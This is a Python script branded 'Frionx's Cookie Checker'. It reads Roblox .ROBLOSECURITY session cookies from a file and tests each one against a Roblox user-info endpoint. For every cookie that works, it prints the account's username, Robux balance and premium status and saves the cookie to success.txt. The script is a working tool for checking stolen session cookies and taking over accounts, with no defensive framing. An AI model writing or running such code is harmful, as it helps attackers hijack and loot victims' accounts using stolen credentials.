import requests
import time
import json
import termcolor
def watermark(text):
    print(termcolor.colored(text, "blue"))
watermark("___________      .__                                 _________                __   .__           _________ .__                   __            ")
watermark("\_   _____/______|__| ____   ____ ___  ___  ______   \_   ___ \  ____   ____ |  | _|__| ____     \_   ___ \|  |__   ____   ____ |  | __ ___________ ")
watermark(" |    __) \_  __ \  |/  _ \ /    \\  \/  / /  ___/   /    \  \/ /  _ \ /  _ \|  |/ /  |/ __ \    /    \  \/|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ \\")
watermark(" |     \   |  | \/  (  <_> )   |  \>    <  \___ \    \     \___(  <_> |  <_> )    <|  \  ___/    \     \___|   Y  \  ___/\  \___|    <\  ___/|  | \/")
watermark(" \___  /   |__|  |__|\____/|___|  /__/\_ \/____  >    \______  /\____/ \____/|__|_ \__|\___  >    \______  /___|  /\___  >\___  >__|_ \\___  >__|   ")
watermark("     \/                         \/      \/     \/            \/                   \/       \/            \/     \/     \/     \/     \/    \/  ")
print(termcolor.colored("Frionx's Cookie Checker", "blue"))
text_file = open("cookies.txt", "r")
lines = text_file.readlines()
apiUrl = "http://www.roblox.com/mobileapi/userinfo"
i = 0
for i in range(0, len(lines)):
    cookie = {'.ROBLOSECURITY': lines[i].replace("\n", "")}
    x = requests.get(apiUrl, cookies=cookie)
    if (x.status_code == 200):
        if "<meta name" in x.text:
            print(termcolor.colored("Cookie did not properly work", "red"))
        else:
            respJson = json.loads(x.text)
            username = respJson["UserName"]
            robux = respJson["RobuxBalance"]
            premium = False
            if respJson['IsPremium'] == "true":
                premium = True
            else:
                premium = False
            print(termcolor.colored("Username: " + str(username) + " | Robux: " + str(robux) + " | Premium: " + str(premium) + " | Cookie: " + str(lines[i]), "green"))
            with open("success.txt", "a") as myfile:
                myfile.write(str(lines[i]))
            time.sleep(0.3)
    else:
        print(termcolor.colored("Request did not properly work", "red"))

input(termcolor.colored("Press enter to close", "red"))